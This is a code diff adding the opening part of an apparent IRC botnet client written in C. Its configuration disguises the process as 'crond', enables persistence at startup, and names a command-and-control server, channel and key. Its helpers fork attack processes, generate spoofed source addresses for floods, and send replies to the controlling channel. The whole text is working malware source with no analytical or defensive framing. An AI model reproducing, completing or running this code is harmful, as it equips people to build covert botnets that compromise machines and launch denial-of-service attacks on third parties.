@@ -1,0 +1,74 @@
+#define STARTUP			// Start on startup?
+#undef IDENT			// Only enable this if you absolutely have to
+#define FAKENAME "crond"	// What you want this to hide as
+#define CHAN "#bsd"	// Channel to join
+#define KEY "routers"		// The key of the channel
+#define IRCPORT "6667"
+ 
+int numservers=1;		// Must change this to equal number of servers down there
+char *servers[] = {		// List the servers in that format, always end in (void*)0
+        "linksys.secureshellz.net",
+        (void*)0
+};
+
+int sock,changeservers=0;
+char *server, *chan, *key, *nick, *ident, *user, disabled=0, execfile[256],dispass[256];
+unsigned int *pids;
+unsigned long spoofs=0, spoofsm=0, numpids=0;
+int strwildmatch(const char* pattern, const char* string) {
+	switch(*pattern) {
+		case '\0': return *string;
+		case '*': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
+		case '?': return !(*string && !strwildmatch(pattern+1, string+1));
+		default: return !((toupper(*pattern) == toupper(*string)) && !strwildmatch(pattern+1, string+1));
+	}
+}
+int Send(int sock, char *words, ...) {
+        static char textBuffer[1024];
+        va_list args;
+        va_start(args, words);
+        vsprintf(textBuffer, words, args);
+        va_end(args);
+        return write(sock,textBuffer,strlen(textBuffer));
+}
+int mfork(char *sender) {
+	unsigned int parent, *newpids, i;
+	if (disabled == 1) {
+		Send(sock,"NOTICE %s :Unable to comply.\n",sender);
+		return 1;
+	}
+	parent=fork();
+	if (parent <= 0) return parent;
+	numpids++;
+	newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
+	for (i=0;i<numpids-1;i++) newpids[i]=pids[i];
+	newpids[numpids-1]=parent;
+	free(pids);
+	pids=newpids;
+	return parent;
+}
+unsigned long getspoof() {
+	if (!spoofs) return rand();
+	if (spoofsm == 1) return ntohl(spoofs);
+	return ntohl(spoofs+(rand() % spoofsm)+1);
+}
+void filter(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }
+char *makestring() {
+	char *tmp;
+	int len=(rand()%5)+4,i;
+ 	FILE *file;
+	tmp=(char*)malloc(len+1);
+ 	memset(tmp,0,len+1);
+ 	if ((file=fopen("/usr/dict/words","r")) == NULL) for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;
+	else {
+		int a=((rand()*rand())%45402)+1;
+		char buf[1024];
+		for (i=0;i<a;i++) fgets(buf,1024,file);
+		memset(buf,0,1024);
+		fgets(buf,1024,file);
+		filter(buf);
+		memcpy(tmp,buf,len);
+		fclose(file);
+	}
+	return tmp;
+}
